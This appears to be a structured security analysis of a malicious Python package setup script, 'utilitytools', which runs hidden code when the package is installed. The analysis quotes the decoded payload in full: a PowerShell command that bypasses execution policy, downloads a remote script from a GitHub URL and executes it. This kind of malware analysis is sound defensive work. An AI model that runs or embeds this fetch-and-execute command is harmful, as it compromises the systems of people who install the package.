  "purpose": "Setup script for a Python package 'utilitytools' with additional custom install behavior.",
  "sources": "Base64-encoded string decoded in notmalfunc(), which is executed during installation.",
  "sinks": "The code in notmalfunc() executes an os.system call with decoded content, potentially executing arbitrary code.",
  "flows": "During package installation, notmalfunc() is called, decoding the base64 string and executing its content via os.system.",
  "anomalies": "Use of base64 decoding and execution of decoded code via os.system; the decoded command runs a shell command that appears to start a PowerShell process with no profile, possibly malicious or obfuscated behavior.",
  "analysis": "The script defines a setup configuration for a Python package. It includes a function b64d() that decodes a base64 string into ASCII. The function notmalfunc() decodes a base64 string which, when decoded, runs a PowerShell command: 'powershell -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/IncsecrGishi/wddwdw/wain/script.ps1')\"'. This indicates the code fetches and executes a remote script from an external URL, which is a significant security risk. This execution occurs during the package installation process via the AfterInstall class, making it likely to be malicious or at least suspicious. The use of base64 encoding obfuscates the command, further raising suspicion.",
  "conclusion": "The setup script contains obfuscated code that fetches and executes remote content during installation, which is highly suspicious and likely malicious. It can compromise the user's system by running arbitrary remote scripts. The rest of the code is standard package setup boilerplate.",
